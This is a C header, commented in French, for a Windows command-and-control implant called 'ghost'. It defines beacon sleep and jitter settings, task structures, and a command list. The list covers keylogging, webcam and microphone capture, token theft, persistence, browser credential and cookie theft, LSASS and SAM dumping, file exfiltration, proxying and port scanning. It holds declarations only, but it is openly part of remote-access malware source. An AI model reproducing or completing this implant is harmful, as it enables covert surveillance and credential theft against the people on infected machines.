/*
 * common.h - Types et définitions communes pour l'agent
 * 
 * Contient les includes de base, macros utilitaires et types custom
 * utilisés dans tout le projet.
 */

#ifndef COMMON_H
#define COMMON_H

/* ============================================================================
 * Windows headers - on évite d'inclure tout windows.h pour réduire la taille
 * ============================================================================ */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>

/* Standard C */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>

/* ============================================================================
 * Macros utilitaires
 * ============================================================================ */

/* Pour éviter les warnings sur les params non utilisés */
#define UNUSED(x) (void)(x)

/* Taille d'un tableau statique */
#define ARRAY_SIZE(arr) (sizeof(arr) / sizeof((arr)[0]))

/* Min/Max */
#define MIN(a, b) ((a) < (b) ? (a) : (b))
#define MAX(a, b) ((a) > (b) ? (a) : (b))

/* Alignement mémoire */
#define ALIGN_UP(x, align) (((x) + ((align) - 1)) & ~((align) - 1))

/* Status codes pour les fonctions internes */
#define STATUS_SUCCESS          0
#define STATUS_FAILURE          1
#define STATUS_NO_MEMORY        2
#define STATUS_NETWORK_ERROR    3
#define STATUS_CRYPTO_ERROR     4
#define STATUS_TASK_ERROR       5

/* ============================================================================
 * Tailles de buffers
 * ============================================================================ */
#define MAX_PATH_LEN            260
#define MAX_URL_LEN             512
#define MAX_HOSTNAME_LEN        64
#define MAX_USERNAME_LEN        64
#define MAX_DOMAIN_LEN          64
#define MAX_RESPONSE_SIZE       (1024 * 1024)    /* 1 MB */
#define MAX_COMMAND_OUTPUT      (512 * 1024)     /* 512 KB */

/* ============================================================================
 * Constantes de l'agent
 * ============================================================================ */
#define AGENT_VERSION           "1.0.0"
#define AGENT_NAME              "ghost"

/* Délais en millisecondes */
#define DEFAULT_SLEEP_MS        60000            /* 60 secondes */
#define DEFAULT_JITTER_PCT      20               /* ±20% */
#define MIN_SLEEP_MS            1000             /* 1 seconde minimum */
#define MAX_SLEEP_MS            3600000          /* 1 heure max */

/* ============================================================================
 * Types customs
 * ============================================================================ */

/* Type de commande reçue du serveur */
typedef enum {
    CMD_NONE = 0,
    CMD_SHELL,          /* Exécute une commande shell */
    CMD_PWD,            /* Affiche le répertoire courant */
    CMD_CD,             /* Change de répertoire */
    CMD_LS,             /* Liste les fichiers */
    CMD_DOWNLOAD,       /* Télécharge depuis la cible */
    CMD_UPLOAD,         /* Upload vers la cible */
    CMD_PS,             /* Liste les processus */
    CMD_KILL,           /* Tue un processus */
    CMD_WHOAMI,         /* Info utilisateur */
    CMD_SYSINFO,        /* Info système */
    CMD_SLEEP,          /* Change le sleep time */
    CMD_EXIT,           /* Termine l'agent */
    CMD_PERSIST,        /* Ajoute de la persistence */
    CMD_TOKEN_LIST,     /* Liste les tokens */
    CMD_TOKEN_STEAL,    /* Vole un token */
    CMD_SCREENSHOT,     /* Capture d'écran */
    CMD_KEYLOG_START,   /* Démarre le keylogger */
    CMD_KEYLOG_STOP,    /* Arrête le keylogger */
    CMD_KEYLOG_DUMP,    /* Récupère les frappes */
    CMD_CLIPBOARD_START,/* Démarre le moniteur presse-papier */
    CMD_CLIPBOARD_STOP, /* Arrête le moniteur presse-papier */
    CMD_CLIPBOARD_DUMP, /* Récupère le presse-papier */
    CMD_WEBCAM_SNAP,    /* Capture une image webcam */
    CMD_MIC_RECORD,     /* Enregistre le microphone */
    CMD_DESKTOP_CAPTURE,/* Capture d'écran bureau distant */
    CMD_DESKTOP_MOUSE,  /* Injection souris */
    CMD_DESKTOP_KEY,    /* Injection clavier */
    CMD_BROWSER_CREDS,  /* Extraction passwords navigateur */
    CMD_BROWSER_COOKIES,/* Extraction cookies navigateur */
    CMD_LSASS_DUMP,     /* Dump LSASS */
    CMD_SAM_DUMP,       /* Dump SAM */
    CMD_SYSTEM_DUMP,    /* Dump SYSTEM */
    CMD_REG_CREDS,      /* Credentials depuis le registre */
    CMD_EXFIL_SEARCH,   /* Recherche fichiers sensibles */
    CMD_EXFIL_READ,     /* Lit un fichier pour exfil */
    CMD_SOCKS5_START,   /* Démarre proxy SOCKS5 */
    CMD_SOCKS5_STOP,    /* Arrête proxy SOCKS5 */
    CMD_PORTFWD_ADD,    /* Ajoute un port forward */
    CMD_PORTFWD_REMOVE, /* Supprime un port forward */
    CMD_PORTFWD_LIST,   /* Liste les port forwards */
    CMD_SCAN_PORTS,     /* Scan ports communs */
    CMD_SCAN_RANGE,     /* Scan plage de ports */
    CMD_SCAN_HOST,      /* Vérifie si hôte up */
    CMD_MAX
} command_type_t;

/* Structure pour une tâche reçue */
typedef struct {
    char            task_id[64];        /* ID unique de la tâche */
    command_type_t  command;            /* Type de commande */
    char*           args;               /* Arguments (alloué dynamiquement) */
    size_t          args_len;           /* Taille des arguments */
    uint8_t*        data;               /* Données binaires (upload, etc) */
    size_t          data_len;           /* Taille des données */
} task_t;

/* Structure pour le résultat d'une tâche */
typedef struct {
    char            task_id[64];        /* ID de la tâche correspondante */
    int             status;             /* Code de retour */
    char*           output;             /* Output texte */
    size_t          output_len;         /* Taille de l'output */
    uint8_t*        data;               /* Données binaires (download) */
    size_t          data_len;           /* Taille des données */
} task_result_t;

/* ============================================================================
 * Prototypes des fonctions utilitaires globales
 * ============================================================================ */

/* Génère un UUID v4 */
void generate_uuid(char* out, size_t out_size);

/* Calcule le sleep avec jitter */
DWORD calculate_sleep_with_jitter(DWORD base_ms, int jitter_pct);

/* Free sécurisé avec zeroing */
void secure_free(void* ptr, size_t size);

#endif /* COMMON_H */
